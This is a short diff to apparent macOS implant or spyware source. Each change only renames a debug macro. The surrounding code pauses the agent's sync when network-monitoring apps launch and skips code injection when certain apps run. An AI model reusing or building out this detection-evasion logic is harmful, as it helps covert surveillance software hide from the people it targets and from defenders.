@@ -3078,7 +3078,7 @@ static void computerWillShutdown(CFMachPortRef port,
   
   NSDictionary *appInfo = [notification userInfo];
   
-#ifdef DEBUG_CORE_T
+#ifdef DEBUG_CORE
   infoLog(@"try to stop crisis agent sync for app %@ (gAgentCrisis)", appInfo, gAgentCrisis);
 #endif
   
@@ -3087,7 +3087,7 @@ static void computerWillShutdown(CFMachPortRef port,
   {
 
     gAgentCrisis = gAgentCrisis & ~CRISIS_SYNC;
-#ifdef DEBUG_CORE_T
+#ifdef DEBUG_CORE
     infoLog(@"Sync enabled! gAgentCrisis = 0x%x", gAgentCrisis);
 #endif
   }
@@ -3100,7 +3100,7 @@ static void computerWillShutdown(CFMachPortRef port,
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   NSDictionary *appInfo = [notification userInfo];
 
-#ifdef DEBUG_CORE_T
+#ifdef DEBUG_CORE
   infoLog(@"running new notificaion on app %@", appInfo);
 #endif
   
@@ -3108,7 +3108,7 @@ static void computerWillShutdown(CFMachPortRef port,
       [self isCrisisNetApp: [appInfo objectForKey: @"NSApplicationName"]]) 
   {
     gAgentCrisis |= CRISIS_SYNC;
-#ifdef DEBUG_CORE_T
+#ifdef DEBUG_CORE
     infoLog(@"Sync disabled! gAgentCrisis = 0x%x", gAgentCrisis);
 #endif
   }
@@ -3116,7 +3116,7 @@ static void computerWillShutdown(CFMachPortRef port,
   if ((gAgentCrisis & CRISIS_START) && 
       [self isCrisisHookApp: [appInfo objectForKey: @"NSApplicationName"]])
   {
-#ifdef DEBUG_CORE_T
+#ifdef DEBUG_CORE
     infoLog(@"NSApplicationName match! skipping injection! CRISIS_SYNC = 0x%x", gAgentCrisis);
 #endif
     return;
